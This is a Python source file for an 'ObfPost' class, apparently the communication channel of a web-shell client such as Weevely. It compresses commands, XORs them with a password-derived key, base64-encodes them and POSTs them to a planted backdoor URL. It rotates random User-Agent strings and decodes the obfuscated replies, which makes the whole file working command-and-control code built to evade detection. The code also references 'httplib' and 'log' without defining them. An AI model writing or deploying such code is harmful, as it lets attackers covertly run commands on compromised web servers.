from core.loggers import dlog
from core import config
import re
import urlparse
import random
import utils
import string
import base64
import urllib2
import hashlib
import zlib

class ObfPost:

    def __init__(self, url, password):

        # Generate the 8 char long main key. Is shared with the server and
        # used to check header, footer, and encrypt the payload.

        passwordhash = hashlib.md5(password).hexdigest().lower()
        self.shared_key = passwordhash[:8]
        self.header = passwordhash[8:20]
        self.trailer = passwordhash[20:32]
        
        self.url = url
        url_parsed = urlparse.urlparse(url)
        self.url_base = '%s://%s' % (url_parsed.scheme, url_parsed.netloc)

        # init regexp for the returning data
        self.re_response = re.compile(
            "%s(.*)%s" % (self.header, self.trailer), re.DOTALL
            )
        self.re_debug = re.compile(
            "%sDEBUG(.*?)%sDEBUG" % (self.header, self.trailer), re.DOTALL
            )

        # Load agents
        self.agents = utils.http.load_all_agents()

        # Init additional headers list
        self.additional_headers = config.additional_headers


    def send(self, original_payload, additional_handlers = []):

        obfuscated_payload = base64.b64encode(
            utils.strings.sxor(
                zlib.compress(original_payload),
                self.shared_key)).rstrip('=')

        wrapped_payload = self.header + obfuscated_payload + self.trailer

        opener = urllib2.build_opener(*additional_handlers)

        additional_ua = ''
        for h in self.additional_headers:
            if h[0].lower() == 'user-agent' and h[1]:
                additional_ua = h[1]
                break

        opener.addheaders = [
            ('User-Agent', (additional_ua if additional_ua else random.choice(self.agents)))
        ] + self.additional_headers

        dlog.debug(
            '[R] %s...' %
            (wrapped_payload[0:32])
        )

        url = (
            self.url if not config.add_random_param_nocache
            else utils.http.add_random_url_param(self.url)
        )

        try:
            response = opener.open(url, data = wrapped_payload).read()
        except httplib.BadStatusLine as e:
            # TODO: add this check to the other channels
            log.warn('Connection closed unexpectedly, aborting command.')
            return

        if not response:
            return

        # Multiple debug string may have been printed, using findall
        matched_debug = self.re_debug.findall(response)
        if matched_debug:
            dlog.debug('\n'.join(matched_debug))

        matched = self.re_response.search(response)
    
        if matched and matched.group(1):
            return zlib.decompress(
                utils.strings.sxor(
                    base64.b64decode(
                        matched.group(1)),
                    self.shared_key))
